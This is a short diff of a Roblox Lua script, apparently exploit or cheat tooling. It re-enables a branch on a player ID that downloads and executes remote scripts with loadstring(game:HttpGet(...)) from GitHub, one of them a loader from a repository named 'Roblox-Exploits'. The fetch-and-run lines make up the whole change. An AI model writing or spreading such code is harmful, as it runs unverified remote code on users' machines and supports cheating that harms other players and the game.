@@ -14,11 +14,11 @@ function getRoot(char)
 	return rootPart
 end
 
---if p.UserId ~= 156256804 then
+if p.UserId ~= 156256804 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
---[[else
+else
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
-end]]
+end
 
 game.Workspace.Effects.ChildAdded:Connect(function(j)
 wait();
